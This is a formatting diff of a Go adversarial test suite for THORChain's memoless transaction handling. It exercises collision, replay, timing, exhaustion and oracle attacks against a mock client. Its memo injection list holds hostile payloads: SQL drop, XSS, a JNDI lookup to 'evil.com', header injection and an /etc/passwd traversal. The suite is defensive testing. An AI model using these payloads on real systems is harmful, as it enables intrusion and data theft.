@@ -12,12 +12,12 @@ import (
 
 	"github.com/stretchr/testify/require"
 	"github.com/stretchr/testify/suite"
-	
+
+	shareTypes "gitlab.com/thorchain/thornode/v3/bifrost/pkg/chainclients/shared/types"
+	btypes "gitlab.com/thorchain/thornode/v3/bifrost/thorclient/types"
 	"gitlab.com/thorchain/thornode/v3/common"
 	"gitlab.com/thorchain/thornode/v3/common/cosmos"
 	stypes "gitlab.com/thorchain/thornode/v3/x/thorchain/types"
-	btypes "gitlab.com/thorchain/thornode/v3/bifrost/thorclient/types"
-	shareTypes "gitlab.com/thorchain/thornode/v3/bifrost/pkg/chainclients/shared/types"
 )
 
 // Adversarial testing suite for economic and cryptographic attacks
@@ -37,16 +37,16 @@ func (suite *MemolessAdversarialTestSuite) SetupTest() {
 	suite.attackEngine = NewAdversarialEngine()
 	adversarialBridge := NewAdversarialThorClient(suite.attackEngine)
 	suite.memoHandler = NewMemolessHandler(adversarialBridge, NewTestLogger())
-	
+
 	suite.securityMetrics = &SecurityMetrics{
-		startTime:           time.Now(),
-		attacksAttempted:    0,
-		attacksSuccessful:   0,
-		vulnerabilities:     make(map[string]int),
-		falsePositives:      0,
-		falseNegatives:      0,
+		startTime:         time.Now(),
+		attacksAttempted:  0,
+		attacksSuccessful: 0,
+		vulnerabilities:   make(map[string]int),
+		falsePositives:    0,
+		falseNegatives:    0,
 	}
-	
+
 	// Define adversarial attack scenarios
 	suite.attackScenarios = []AdversarialScenario{
 		{
@@ -113,17 +113,17 @@ func (suite *MemolessAdversarialTestSuite) executeAdversarialScenario(scenario A
 	suite.T().Logf("🎯 Executing adversarial scenario: %s", scenario.name)
 	suite.T().Logf("🔍 Description: %s", scenario.description)
 	suite.T().Logf("⚠️  Severity: %s, Duration: %v", scenario.severity, scenario.duration)
-	
+
 	// Configure attack engine for this scenario
 	suite.attackEngine.ConfigureAttack(scenario)
-	
+
 	// Start attack
 	ctx, cancel := context.WithTimeout(context.Background(), scenario.duration)
 	defer cancel()
-	
+
 	suite.attackEngine.StartAttack(ctx)
 	defer suite.attackEngine.StopAttack()
-	
+
 	// Execute the specific attack scenario
 	switch scenario.attackType {
 	case ReferenceCollision:
@@ -141,7 +141,7 @@ func (suite *MemolessAdversarialTestSuite) executeAdversarialScenario(scenario A
 	case OracleManipulation:
 		suite.executeOracleManipulationAttack(ctx)
 	}
-	
+
 	// Analyze attack results and validate security
 	suite.analyzeAttackResults(scenario)
 	suite.validateSecurityInvariants(scenario)
@@ -149,10 +149,10 @@ func (suite *MemolessAdversarialTestSuite) executeAdversarialScenario(scenario A
 
 func (suite *MemolessAdversarialTestSuite) executeReferenceCollisionAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing reference collision attack")
-	
+
 	// Attempt to create colliding references
 	targetReference := "12345"
-	
+
 	// Try different collision strategies
 	collisionStrategies := []string{
 		"012345", // Leading zero variation
@@ -160,9 +160,9 @@ func (suite *MemolessAdversarialTestSuite) executeReferenceCollisionAttack(ctx c
 		"1234",   // Truncated
 		"123456", // Extended
 		"١٢٣٤٥",  // Unicode digits (Arabic-Indic)
-		"𝟏𝟐𝟑𝟒𝟓", // Mathematical digits
+		"𝟏𝟐𝟑𝟒𝟓",  // Mathematical digits
 	}
-	
+
 	successfulCollisions := 0
 	for _, strategy := range collisionStrategies {
 		select {
@@ -177,19 +177,19 @@ func (suite *MemolessAdversarialTestSuite) executeReferenceCollisionAttack(ctx c
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
 	}
-	
-	suite.T().Logf("📊 Reference collision results: %d/%d successful", 
+
+	suite.T().Logf("📊 Reference collision results: %d/%d successful",
 		successfulCollisions, len(collisionStrategies))
 }
 
 func (suite *MemolessAdversarialTestSuite) executeAmountManipulationAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing amount manipulation attack")
-	
+
 	// Test various amount manipulation techniques
 	manipulationTests := []struct {
-		name        string
-		baseAmount  uint64
-		manipulation func(uint64) uint64
+		name            string
+		baseAmount      uint64
+		manipulation    func(uint64) uint64
 		expectDetection bool
 	}{
 		{
@@ -225,7 +225,7 @@ func (suite *MemolessAdversarialTestSuite) executeAmountManipulationAttack(ctx c
 			expectDetection: true,
 		},
 	}
-	
+
 	successfulManipulations := 0
 	for _, test := range manipulationTests {
 		select {
@@ -234,34 +234,34 @@ func (suite *MemolessAdversarialTestSuite) executeAmountManipulationAttack(ctx c
 		default:
 			manipulatedAmount := test.manipulation(test.baseAmount)
 			detected := suite.testAmountManipulation(test.name, manipulatedAmount, test.expectDetection)
-			
+
 			if detected != test.expectDetection {
 				successfulManipulations++
 				suite.securityMetrics.recordVulnerability("amount_manipulation")
 			}
-			
+
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
 	}
-	
+
 	suite.T().Logf("📊 Amount manipulation results: %d unexpected detections", successfulManipulations)
 }
 
 func (suite *MemolessAdversarialTestSuite) executeMemoInjectionAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing memo injection attack")
-	
+
 	// Test memo injection payloads
 	injectionPayloads := []string{
 		"SWAP:BTC.BTC'; DROP TABLE memos; --", // SQL injection style
-		"SWAP:<script>alert('xss')</script>",   // XSS style
-		"SWAP:\x00\x01\x02\x03\x04",          // Binary injection
-		"SWAP:" + string(make([]byte, 10000)),  // Buffer overflow attempt
+		"SWAP:<script>alert('xss')</script>",  // XSS style
+		"SWAP:\x00\x01\x02\x03\x04",           // Binary injection
+		"SWAP:" + string(make([]byte, 10000)), // Buffer overflow attempt
 		"SWAP:${jndi:ldap://evil.com/a}",      // JNDI injection
-		"../../../etc/passwd",                  // Path traversal
+		"../../../etc/passwd",                 // Path traversal
 		"SWAP:%{#context}",                    // Template injection
-		"SWAP:\r\nHOST: evil.com\r\n\r\n",    // Header injection
+		"SWAP:\r\nHOST: evil.com\r\n\r\n",     // Header injection
 	}
-	
+
 	successfulInjections := 0
 	for i, payload := range injectionPayloads {
 		select {
@@ -276,14 +276,14 @@ func (suite *MemolessAdversarialTestSuite) executeMemoInjectionAttack(ctx contex
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
 	}
-	
-	suite.T().Logf("📊 Memo injection results: %d/%d successful", 
+
+	suite.T().Logf("📊 Memo injection results: %d/%d successful",
 		successfulInjections, len(injectionPayloads))
 }
 
 func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing replay attack")
-	
+
 	// Create legitimate transaction first
 	originalTx := &btypes.TxInItem{
 		Tx: common.Tx{
@@ -293,17 +293,17 @@ func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Conte
 		},
 		BlockHeight: 144000,
 	}
-	
+
 	// Process original transaction
 	_, err := suite.memoHandler.ProcessMemolessTransaction(originalTx)
 	if err != nil {
 		suite.T().Logf("⚠️  Original transaction failed: %v", err)
 		return
 	}
-	
+
 	// Attempt replay attacks with variations
 	replayVariations := []struct {
-		name string
+		name     string
 		modifier func(*btypes.TxInItem) *btypes.TxInItem
 	}{
 		{
@@ -321,7 +321,7 @@ func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Conte
 			},
 		},
 		{
-			name: "id_modified_replay", 
+			name: "id_modified_replay",
 			modifier: func(tx *btypes.TxInItem) *btypes.TxInItem {
 				newTx := *tx
 				newTx.Tx.ID = common.TxID("replayed-" + string(tx.Tx.ID))
@@ -329,7 +329,7 @@ func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Conte
 			},
 		},
 	}
-	
+
 	successfulReplays := 0
 	for _, variation := range replayVariations {
 		select {
@@ -344,17 +344,17 @@ func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Conte
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
 	}
-	
-	suite.T().Logf("📊 Replay attack results: %d/%d successful", 
+
+	suite.T().Logf("📊 Replay attack results: %d/%d successful",
 		successfulReplays, len(replayVariations))
 }
 
 func (suite *MemolessAdversarialTestSuite) executeTimingAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing timing attack")
-	
+
 	// Measure timing differences for various inputs
 	timingMeasurements := make(map[string][]time.Duration)
-	
+
 	// Test different scenarios that might have timing differences
 	scenarios := map[string]func() (*btypes.TxInItem, bool){
 		"valid_memoless": func() (*btypes.TxInItem, bool) {
@@ -388,29 +388,29 @@ func (suite *MemolessAdversarialTestSuite) executeTimingAttack(ctx context.Conte
 			}, true // Will be detected as memoless but memo lookup will fail
 		},
 	}
-	
+
 	// Collect timing measurements
 	samplesPerScenario := 100
 	for scenarioName, generator := range scenarios {
 		timingMeasurements[scenarioName] = make([]time.Duration, 0, samplesPerScenario)
-		
+
 		for i := 0; i < samplesPerScenario; i++ {
 			select {
 			case <-ctx.Done():
 				goto analyze
 			default:
 				tx, _ := generator()
-				
+
 				start := time.Now()
 				suite.memoHandler.ProcessMemolessTransaction(tx)
 				duration := time.Since(start)
-				
+
 				timingMeasurements[scenarioName] = append(timingMeasurements[scenarioName], duration)
 				atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 			}
 		}
 	}
-	
+
 analyze:
 	// Analyze timing differences
 	suite.analyzeTimingAttack(timingMeasurements)
@@ -418,12 +418,12 @@ analyze:
 
 func (suite *MemolessAdversarialTestSuite) executeResourceExhaustionAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing resource exhaustion attack")
-	
+
 	// Launch concurrent resource exhaustion attacks
 	var wg sync.WaitGroup
 	attackWorkers := 50
 	requestsPerWorker := 1000
-	
+
 	startTime := time.Now()
 	for worker := 0; worker < attackWorkers; worker++ {
 		wg.Add(1)
@@ -432,28 +432,28 @@ func (suite *MemolessAdversarialTestSuite) executeResourceExhaustionAttack(ctx c
 			suite.runResourceExhaustionWorker(ctx, workerID, requestsPerWorker)
 		}(worker)
 	}
-	
+
 	// Monitor system resources during attack
 	go suite.monitorResourceUsage(ctx)
-	
+
 	wg.Wait()
 	duration := time.Since(startTime)
-	
+
 	totalRequests := int64(attackWorkers * requestsPerWorker)
 	throughput := float64(totalRequests) / duration.Seconds()
-	
+
 	suite.T().Logf("📊 Resource exhaustion attack completed:")
 	suite.T().Logf("   Duration: %v", duration)
 	suite.T().Logf("   Total Requests: %d", totalRequests)
 	suite.T().Logf("   Throughput: %.2f req/sec", throughput)
-	
+
 	// System should remain functional
 	suite.validateSystemFunctionality()
 }
 
 func (suite *MemolessAdversarialTestSuite) executeOracleManipulationAttack(ctx context.Context) {
 	suite.T().Logf("🔥 Executing oracle manipulation attack")
-	
+
 	// Configure adversarial oracle responses
 	manipulationStrategies := []OracleManipulation{
 		{
@@ -477,7 +477,7 @@ func (suite *MemolessAdversarialTestSuite) executeOracleManipulationAttack(ctx c
 			payload:  "expired_memo_content",
 		},
 	}
-	
+
 	successfulManipulations := 0
 	for _, manipulation := range manipulationStrategies {
 		select {
@@ -485,7 +485,7 @@ func (suite *MemolessAdversarialTestSuite) executeOracleManipulationAttack(ctx c
 			return
 		default:
 			suite.attackEngine.ConfigureOracle(manipulation)
-			
+
 			if suite.testOracleManipulation(manipulation) {
 				successfulManipulations++
 				suite.securityMetrics.recordVulnerability("oracle_manipulation")
@@ -493,8 +493,8 @@ func (suite *MemolessAdversarialTestSuite) executeOracleManipulationAttack(ctx c
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
 	}
-	
-	suite.T().Logf("📊 Oracle manipulation results: %d/%d successful", 
+
+	suite.T().Logf("📊 Oracle manipulation results: %d/%d successful",
 		successfulManipulations, len(manipulationStrategies))
 }
 
@@ -504,7 +504,7 @@ func (suite *MemolessAdversarialTestSuite) attemptReferenceCollision(target, col
 	// Test if collision strategy bypasses reference validation
 	utils := shareTypes.NewMemolessUtils()
 	baseAmount := uint64(1000)
-	
+
 	// Try to create amount with colliding reference
 	if len(collision) == 5 {
 		testAmount := cosmos.NewUint(baseAmount*100000 + parseReference(collision))
@@ -515,7 +515,7 @@ func (suite *MemolessAdversarialTestSuite) attemptReferenceCollision(target, col
 		extractedRef, err := utils.ExtractReferenceFromAmount(testAmount)
 		return err == nil && extractedRef == target
 	}
-	
+
 	return false
 }
 
@@ -523,7 +523,7 @@ func (suite *MemolessAdversarialTestSuite) testAmountManipulation(testName strin
 	utils := shareTypes.NewMemolessUtils()
 	testAmount := cosmos.NewUint(amount)
 	isMemoless, _, _ := utils.IsMemolessTransaction("", common.Coins{common.NewCoin(common.RuneAsset(), testAmount)})
-	suite.T().Logf("🧪 Amount manipulation test '%s': amount=%d, detected=%v, expected=%v", 
+	suite.T().Logf("🧪 Amount manipulation test '%s': amount=%d, detected=%v, expected=%v",
 		testName, amount, isMemoless, expectDetection)
 	return isMemoless
 }
@@ -531,11 +531,11 @@ func (suite *MemolessAdversarialTestSuite) testAmountManipulation(testName strin
 func (suite *MemolessAdversarialTestSuite) attemptMemoInjection(reference, payload string) bool {
 	// Configure attack engine to return malicious memo
 	suite.attackEngine.SetMaliciousMemo(reference, payload)
-	
+
 	// Create test transaction
 	baseAmount := uint64(1000)
 	memolessAmount := baseAmount*100000 + parseReference(reference)
-	
+
 	tx := &btypes.TxInItem{
 		Tx: common.Tx{
 			ID:    common.TxID(fmt.Sprintf("injection-test-%s", reference)),
@@ -544,13 +544,13 @@ func (suite *MemolessAdversarialTestSuite) attemptMemoInjection(reference, paylo
 		},
 		BlockHeight: 144000,
 	}
-	
+
 	// Process transaction and check if injection succeeded
 	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(tx)
 	if err != nil {
 		return false // Injection failed (good)
 	}
-	
+
 	// Check if malicious content made it through
 	return processedTx != nil && processedTx.Tx.Memo == payload
 }
@@ -558,35 +558,35 @@ func (suite *MemolessAdversarialTestSuite) attemptMemoInjection(reference, paylo
 func (suite *MemolessAdversarialTestSuite) attemptReplayAttack(attackName string, replayTx *btypes.TxInItem) bool {
 	// Process the replayed transaction
 	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(replayTx)
-	
+
 	// Replay should be detected and rejected
 	if err != nil {
 		suite.T().Logf("✅ Replay attack '%s' correctly rejected: %v", attackName, err)
 		return false // Attack failed (good)
 	}
-	
+
 	if processedTx != nil {
 		suite.T().Logf("🚨 Replay attack '%s' succeeded - security vulnerability!", attackName)
 		return true // Attack succeeded (bad)
 	}
-	
+
 	return false
 }
 
 func (suite *MemolessAdversarialTestSuite) analyzeTimingAttack(measurements map[string][]time.Duration) {
 	suite.T().Logf("📊 Timing attack analysis:")
-	
+
 	stats := make(map[string]TimingStats)
-	
+
 	for scenario, times := range measurements {
 		if len(times) == 0 {
 			continue
 		}
-		
+
 		var total, min, max time.Duration
 		min = time.Hour
 		max = 0
-		
+
 		for _, duration := range times {
 			total += duration
 			if duration < min {
@@ -596,20 +596,20 @@ func (suite *MemolessAdversarialTestSuite) analyzeTimingAttack(measurements map[
 				max = duration
 			}
 		}
-		
+
 		avg := total / time.Duration(len(times))
-		
+
 		stats[scenario] = TimingStats{
 			samples: len(times),
 			min:     min,
 			max:     max,
 			avg:     avg,
 		}
-		
-		suite.T().Logf("   %s: avg=%v, min=%v, max=%v, samples=%d", 
+
+		suite.T().Logf("   %s: avg=%v, min=%v, max=%v, samples=%d",
 			scenario, avg, min, max, len(times))
 	}
-	
+
 	// Check for suspicious timing patterns
 	suite.detectTimingVulnerabilities(stats)
 }
@@ -617,14 +617,14 @@ func (suite *MemolessAdversarialTestSuite) analyzeTimingAttack(measurements map[
 func (suite *MemolessAdversarialTestSuite) detectTimingVulnerabilities(stats map[string]TimingStats) {
 	// Look for significant timing differences that could leak information
 	timingRatios := make(map[string]float64)
-	
+
 	for scenario1, stats1 := range stats {
 		for scenario2, stats2 := range stats {
 			if scenario1 != scenario2 {
 				ratio := float64(stats1.avg) / float64(stats2.avg)
 				key := fmt.Sprintf("%s_vs_%s", scenario1, scenario2)
 				timingRatios[key] = ratio
-				
+
 				if ratio > 2.0 || ratio < 0.5 {
 					suite.T().Logf("⚠️  Potential timing vulnerability: %s (ratio: %.2f)", key, ratio)
 					suite.securityMetrics.recordVulnerability("timing_side_channel")
@@ -644,7 +644,7 @@ func (suite *MemolessAdversarialTestSuite) runResourceExhaustionWorker(ctx conte
 			reference := fmt.Sprintf("%05d", rand.Intn(100000))
 			baseAmount := uint64(rand.Intn(1000000) + 1000)
 			memolessAmount := baseAmount*100000 + parseReference(reference)
-			
+
 			tx := &btypes.TxInItem{
 				Tx: common.Tx{
 					ID:    common.TxID(fmt.Sprintf("exhaust-%d-%d", workerID, i)),
@@ -653,7 +653,7 @@ func (suite *MemolessAdversarialTestSuite) runResourceExhaustionWorker(ctx conte
 				},
 				BlockHeight: int64(144000 + rand.Intn(1000)),
 			}
-			
+
 			suite.memoHandler.ProcessMemolessTransaction(tx)
 			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
 		}
@@ -663,7 +663,7 @@ func (suite *MemolessAdversarialTestSuite) runResourceExhaustionWorker(ctx conte
 func (suite *MemolessAdversarialTestSuite) monitorResourceUsage(ctx context.Context) {
 	ticker := time.NewTicker(time.Second)
 	defer ticker.Stop()
-	
+
 	for {
 		select {
 		case <-ctx.Done():
@@ -685,7 +685,7 @@ func (suite *MemolessAdversarialTestSuite) validateSystemFunctionality() {
 		},
 		BlockHeight: 144000,
 	}
-	
+
 	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(normalTx)
 	suite.Require().NoError(err, "System should remain functional after resource exhaustion attack")
 	suite.Require().NotNil(processedTx, "Transaction processing should work after attack")
@@ -701,10 +701,10 @@ func (suite *MemolessAdversarialTestSuite) testOracleManipulation(manipulation O
 		},
 		BlockHeight: 144000,
 	}
-	
+
 	// Process with manipulated oracle
 	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(tx)
-	
+
 	// Check if manipulation succeeded
 	switch manipulation.strategy {
 	case FalseMemoResponse:
@@ -723,19 +723,19 @@ func (suite *MemolessAdversarialTestSuite) testOracleManipulation(manipulation O
 func (suite *MemolessAdversarialTestSuite) analyzeAttackResults(scenario AdversarialScenario) {
 	attacksAttempted := atomic.LoadInt64(&suite.securityMetrics.attacksAttempted)
 	attacksSuccessful := atomic.LoadInt64(&suite.securityMetrics.attacksSuccessful)
-	
+
 	if attacksAttempted == 0 {
 		suite.T().Logf("⚠️  No attacks were attempted for scenario %s", scenario.name)
 		return
 	}
-	
+
 	successRate := float64(attacksSuccessful) / float64(attacksAttempted) * 100
-	
+
 	suite.T().Logf("📊 Attack Results for %s:", scenario.name)
 	suite.T().Logf("   Attacks Attempted: %d", attacksAttempted)
 	suite.T().Logf("   Attacks Successful: %d", attacksSuccessful)
 	suite.T().Logf("   Success Rate: %.2f%%", successRate)
-	
+
 	// Log vulnerability breakdown
 	if len(suite.securityMetrics.vulnerabilities) > 0 {
 		suite.T().Logf("🔍 Vulnerabilities Discovered:")
@@ -747,7 +747,7 @@ func (suite *MemolessAdversarialTestSuite) analyzeAttackResults(scenario Adversa
 
 func (suite *MemolessAdversarialTestSuite) validateSecurityInvariants(scenario AdversarialScenario) {
 	attacksSuccessful := atomic.LoadInt64(&suite.securityMetrics.attacksSuccessful)
-	
+
 	// Define acceptable attack success thresholds based on severity
 	var maxSuccessRate float64
 	switch scenario.severity {
@@ -760,16 +760,16 @@ func (suite *MemolessAdversarialTestSuite) validateSecurityInvariants(scenario A
 	case Low:
 		maxSuccessRate = 0.20 // Max 20% success rate for low severity
 	}
-	
+
 	attacksAttempted := atomic.LoadInt64(&suite.securityMetrics.attacksAttempted)
 	if attacksAttempted > 0 {
 		actualSuccessRate := float64(attacksSuccessful) / float64(attacksAttempted)
-		
+
 		suite.Require().LessOrEqual(actualSuccessRate, maxSuccessRate,
 			"🔴 Security invariant violated for %s: success rate %.2f%% exceeds threshold %.2f%%",
 			scenario.name, actualSuccessRate*100, maxSuccessRate*100)
 	}
-	
+
 	// Validate no critical vulnerabilities were found
 	criticalVulns := []string{"reference_collision", "memo_injection", "oracle_manipulation"}
 	for _, vuln := range criticalVulns {
@@ -781,17 +781,17 @@ func (suite *MemolessAdversarialTestSuite) validateSecurityInvariants(scenario A
 			}
 		}
 	}
-	
+
 	suite.T().Logf("✅ Security invariants validated for %s", scenario.name)
 }
 
 // Supporting types and structures defined in memoless_test_utils.go
 
 type AdversarialEngine struct {
-	activeAttacks   map[AttackType]bool
-	maliciousMemos  map[string]string
-	oracleConfig    OracleManipulation
-	mu              sync.RWMutex
+	activeAttacks  map[AttackType]bool
+	maliciousMemos map[string]string
+	oracleConfig   OracleManipulation
+	mu             sync.RWMutex
 }
 
 func NewAdversarialEngine() *AdversarialEngine {
@@ -850,7 +850,7 @@ func (atc *AdversarialThorClient) Broadcast(msgs ...cosmos.Msg) (common.TxID, er
 
 func (atc *AdversarialThorClient) GetRegisteredMemo(reference string) (*stypes.RegisteredMemo, error) {
 	atc.attackEngine.mu.RLock()
-	
+
 	// Check for malicious memo injection
 	if payload, exists := atc.attackEngine.maliciousMemos[reference]; exists {
 		atc.attackEngine.mu.RUnlock()
@@ -863,7 +863,7 @@ func (atc *AdversarialThorClient) GetRegisteredMemo(reference string) (*stypes.R
 			Status:       "active",
 		}, nil
 	}
-	
+
 	// Check for oracle manipulation
 	if atc.attackEngine.oracleConfig.strategy == DelayedResponse {
 		delay := atc.attackEngine.oracleConfig.delay
@@ -871,7 +871,7 @@ func (atc *AdversarialThorClient) GetRegisteredMemo(reference string) (*stypes.R
 		time.Sleep(delay)
 		return atc.normalClient.GetRegisteredMemo(reference)
 	}
-	
+
 	atc.attackEngine.mu.RUnlock()
 	return atc.normalClient.GetRegisteredMemo(reference)
 }
